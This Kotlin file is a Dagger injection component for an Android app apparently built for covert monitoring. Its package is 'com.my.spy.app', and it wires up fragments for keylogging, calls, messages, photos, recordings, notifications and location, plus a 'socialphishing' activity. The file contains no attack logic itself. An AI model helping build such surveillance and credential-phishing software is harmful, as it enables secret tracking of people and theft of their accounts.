package com.my.spy.app.di.component

import com.my.spy.app.di.PerActivity
import com.my.spy.app.di.module.ActivityModule
import com.my.spy.app.ui.activities.mainparent.MainParentActivity
import com.my.spy.app.ui.activities.register.RegisterActivity
import com.my.spy.app.ui.activities.login.LoginActivity
import com.my.spy.app.ui.activities.mainchild.MainChildActivity
import com.my.spy.app.ui.activities.socialphishing.SocialActivityM
import com.my.spy.app.ui.fragments.calls.CallsFragment
import com.my.spy.app.ui.fragments.photo.PhotoFragment
import com.my.spy.app.ui.fragments.keylog.KeysFragment
import com.my.spy.app.ui.fragments.maps.MapsFragment
import com.my.spy.app.ui.fragments.message.MessageFragment
import com.my.spy.app.ui.fragments.notifications.NotifyMessageFragment
import com.my.spy.app.ui.fragments.recording.RecordingFragment
import com.my.spy.app.ui.fragments.social.SocialFragment
import dagger.Component

@PerActivity
@Component(dependencies = [AppComponent::class],modules = [ActivityModule::class])
interface ActivityComponent {

    fun inject(loginActivity: LoginActivity)
    fun inject(registerActivity: RegisterActivity)
    fun inject(mainParentActivity: MainParentActivity)
    fun inject(mainChildActivity: MainChildActivity)
    fun inject(socialActivityM: SocialActivityM)
    fun inject(mapsFragment: MapsFragment)
    fun inject(callsFragment: CallsFragment)
    fun inject(messageFragment: MessageFragment)
    fun inject(photoFragment: PhotoFragment)
    fun inject(keysFragment: KeysFragment)
    fun inject(socialFragment: SocialFragment)
    fun inject(recordingFragment: RecordingFragment)
    fun inject(notifyMessageFragment: NotifyMessageFragment)

}